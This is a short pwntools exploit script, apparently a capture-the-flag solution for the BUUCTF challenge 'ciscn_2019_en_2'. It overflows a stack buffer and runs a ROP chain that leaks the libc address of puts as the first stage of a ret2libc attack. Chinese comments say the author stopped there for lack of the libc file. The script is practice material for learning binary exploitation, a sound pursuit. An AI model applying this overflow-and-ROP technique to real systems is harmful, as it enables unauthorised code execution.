#Made by fly_autumn
#x64 ret2libc

from pwn import *
p = process("./ciscn_2019_en_2")
elf = ELF("./ciscn_2019_en_2")
context(os="linux",arch="amd64")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
start_plt = 0x400790
pop_rdi = 0x400c83 
offset = 88
p.recvuntil(b"choice!\n")
p.sendline(b"1")
p.recvuntil(b"encrypted\n")
payload = b"\00" + b"A"*(offset-1)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_plt)
p.sendline(payload)
p.recvline()
p.recvline()
puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
#只能写到这里了，BUUCTF没给libc我也没办法了
#顺带一提这道题和ciscn_2019_c_1是一模一样的......

p.interactive()
